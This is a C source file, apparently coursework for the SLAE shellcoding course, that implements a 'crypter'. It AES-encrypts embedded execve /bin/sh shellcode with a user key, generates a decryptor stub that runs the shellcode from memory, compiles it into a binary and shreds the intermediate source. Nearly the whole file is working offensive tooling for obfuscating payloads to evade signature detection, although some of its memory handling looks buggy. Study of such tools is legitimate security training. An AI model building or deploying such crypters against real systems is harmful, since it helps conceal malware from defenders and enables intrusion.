/*
 *	SLAE Assignment 7: Crypter
 *
 *	gcc a7-crypter.c -o a7-crypter -std=c99 -lmcrypt
 *
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <mcrypt.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>


/* execve shellcode */
unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x1c\x24\x50\x8d\x14\x24\x53\x8d\x0c\x24\xb0\x0b\xcd\x80";


int hasbadchar(unsigned char* str)
{
	unsigned char* badchars[] = { "00", "0a", "0d" };

	for (int i = 0; i < sizeof(badchars) / sizeof(badchars[0]); i++) {
		if (strstr(str, badchars[i])) return 1;
	}

	return 0;
}


char* strsub(char* str, char* orig, char* rep)
{
	size_t p1 = strstr(str, orig) - str;
	size_t p2o = p1 + strlen(orig);
	size_t p2r = p1 + strlen(rep);
	size_t p3 = strlen(str) - p2o;
	
	char* ret = malloc(strlen(str) - strlen(orig) + strlen(rep));

	memcpy(ret, str, p1);
	memcpy(ret + p1, rep, strlen(rep));
	memcpy(ret + p2r, str + p2o, p3);

	return ret;
}


void makeElf(unsigned char* crypt, unsigned char* decrypt) 
{
	unsigned char skeleton[] = "\
	#include <stdio.h> \n\
	#include <stdlib.h> \n\
	#include <string.h> \n\
	#include <mcrypt.h> \n\
	unsigned char code[] = \"__SHELLCODE__\"; \n\
	unsigned char vector[] = \"__VECTOR__\"; \n\
	int main() { \n\
	MCRYPT m = mcrypt_module_open(\"rijndael-128\", NULL, \"cbc\", NULL); \n\
	int key_len = strlen(vector) - mcrypt_enc_get_iv_size(m); \n\
	unsigned char* key = malloc(key_len); \n\
	unsigned char* iv = malloc(mcrypt_enc_get_iv_size(m)); \n\
	memcpy(key, &vector, key_len); \n\
	memcpy(iv, &vector[key_len], mcrypt_enc_get_iv_size(m)); \n\
	mcrypt_generic_init(m, key, strlen(key), iv); \n\
	mdecrypt_generic(m, code, strlen(code)); \n\
	mcrypt_generic_deinit(m); \n\
	mcrypt_module_close(m); \n\
	int (*ret)() = (int(*)())code; \n\
	ret();}";

	unsigned char* elf = malloc(strlen(skeleton) + strlen(crypt) + strlen(decrypt));

	bzero(elf, strlen(elf));

	elf = strsub(skeleton, "__SHELLCODE__", crypt);
	elf = strsub(elf, "__VECTOR__", decrypt);
	
	FILE *f = fopen("a.c", "w");
	fprintf(f, "%s", elf);
	fclose(f);

	system("gcc a.c -std=c99 -lmcrypt && shred -vzun 3 a.c 2>/dev/null && mv a.out crypted");
}


int main(int argc, char* argv[])
{
	if (argc < 2 || strlen(argv[1]) < 7) {
		printf("[*] Usage: %s <encryption-key-7chars-min>\n", argv[0]);
		return 0;
	}

/* encrypt shellcode */
	unsigned char* key = argv[1];
	int pad = (16 - (strlen(code) % 16)) % 16;
	int buf_len = strlen(code) + pad;
	char* buf = malloc(buf_len);
	int ok = 0;

	MCRYPT m;
	if ((m = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL)) == MCRYPT_FAILED) { printf("MCRYPT failed\n"); return 0; }
	int blocksize = mcrypt_enc_get_block_size(m);
	if (blocksize % sizeof(buf)) { printf("bad block size\n"); return 0; }

	unsigned char* iv = malloc(mcrypt_enc_get_iv_size(m));

	while (!ok) {
		bzero(iv, mcrypt_enc_get_iv_size(m));

		int fd = open("/dev/urandom", O_RDONLY);
		read(fd, iv, mcrypt_enc_get_iv_size(m));
		close(fd);

		if (strlen(iv) < mcrypt_enc_get_iv_size(m)) {
			ok = 0;
			printf("[-] IV failed. Retrying...\n");
			continue;
		} else {
			ok = 1;
		}

		bzero(buf, buf_len);

		strncpy(buf, code, strlen(code));	

		for (int i = 0; i < pad; i++) { 
			strcat(buf, " "); 
		}

		if (mcrypt_generic_init(m, key, strlen(key), iv) < 0) { printf("init failed\n"); return 0; }
		if (mcrypt_generic(m, buf, strlen(buf))) { printf("encrypt failed\n"); return 0; }
		if (mcrypt_generic_deinit(m) < 0) { printf("deinit failed\n"); return 0; }

		if (strlen(buf) != buf_len) {
			ok = 0;
			printf("[-] Encryption failed. Retrying...\n");
			continue;
		} else {
			ok = 1;
		}

		unsigned char* vector = malloc(strlen(key) + strlen(iv));

		memcpy(vector, key, strlen(key));
		memcpy(vector+strlen(key), iv, strlen(iv));
		
	/* convert to opcode format */
		char* op = malloc(4);
		char* crypt = malloc(strlen(buf) * 4 + 1);
		char* decrypt = malloc(strlen(vector) * 4 + 1);

		bzero(crypt, strlen(crypt));
		bzero(decrypt, strlen(decrypt));

		for (int i = 0; i < strlen(buf); i++) { 
			sprintf(op, "\\x%02x", buf[i] & 0xff);
			strcat(crypt, op);
		}

		for (int i = 0; i < strlen(vector); i++) { 
			sprintf(op, "\\x%02x", vector[i] & 0xff);
			strcat(decrypt, op);
		}


		/* check for bad chars */
		if (hasbadchar(crypt) || hasbadchar(decrypt)) {
			printf("[-] Bad characters identified. Retrying...\n");
			ok = 0;
			continue;
		} else {
			/* make crypted elf */
			makeElf(crypt, decrypt);

			/* info */
			printf("[*] Key: ");
			for (int i = 0; i < strlen(key); i++) { 
				printf("%02x", key[i] & 0xff); 
			}
			printf("\n[*] Key Length: %d\n", strlen(key));
			printf("[*] IV: ");
			for (int i = 0; i < strlen(iv); i++) { 
				printf("%02x", iv[i] & 0xff); 
			}
			printf("\n[*] IV Length: %d\n", strlen(iv));
			printf("[*] Shellcode Length: %d\n", strlen(code));
			printf("[*] Padding: %d\n", pad);
			printf("[*] Crypted Length: %d\n", strlen(buf));
			printf("[+] Vector: \n\n%s\n\n", decrypt);
			printf("[+] Crypt: \n\n%s\n\n", crypt);
			printf("[+] Saved as 'crypted'\n\n");
		}
	}
	
	mcrypt_module_close(m);





	
	return 0;
}
